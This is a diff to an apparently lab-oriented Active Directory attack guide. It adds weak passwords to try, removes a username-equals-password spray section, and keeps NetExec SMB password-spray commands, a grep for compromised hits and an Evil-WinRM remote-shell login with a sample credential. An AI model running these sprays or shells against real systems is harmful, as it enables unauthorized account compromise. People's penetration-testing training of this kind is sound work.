@@ -54,20 +54,13 @@ netexec smb 10.10.X.10 -u 'usernames.txt' -p 'L@bl0cal' -d lab.local -t 5 --cont
 
 ![image](https://github.com/user-attachments/assets/dc1f1de3-db2e-4ec0-a77a-8dec589ae5af)
 
+### Test Also with:
+> - `1g2w3e4r`
+> - `!@#$%^&*`
+> - `1qaz2wsx`
+> - `!QAZ2wsx`
 
-## Netexec 2 - Matching username = password
-Run a password spray using NetExec:
-```bash
-netexec smb 10.10.X.10 -u 'usernames.txt' -p 'usernames.txt' -d lab.local -t 5 --continue-on-success --dns-tcp --dns-server 10.10.X.10 --log password_equal_username
-```
-> - Tests each user with their own username as password
-> - Example: jdoe:jdoe, admin:admin
-> - Simple, effective, and surprisingly successful in many orgs
-
-![image](https://github.com/user-attachments/assets/4d53a9b8-561d-40ef-ad1e-d9efa8b0e0e2)
-
-
-## Netexec 3 - Full Spray with Password List
+## Netexec 2 - Full Spray with Password List
 ```bash
 netexec smb 10.10.X.10 -u 'usernames.txt' -p 'passwords.txt' -d lab.local -t 5 --continue-on-success --dns-tcp --dns-server 10.10.X.10 --log pass_sweep
 ```
@@ -85,7 +78,7 @@ cat pass_sweep | grep Pwn3d!
 ![image](https://github.com/user-attachments/assets/07e8b1b2-0e0b-412d-aa21-d1e12f0aa8fe)
 
 ## Remote Shell via Evil-WinRM
-For targets with `WinRM` enabled do:
+For targets with `WinRM` enabled:
 ```
 evil-winrm -i 10.10.X.10 -u svc_exchange  -p 1q2w3e4r
 ```
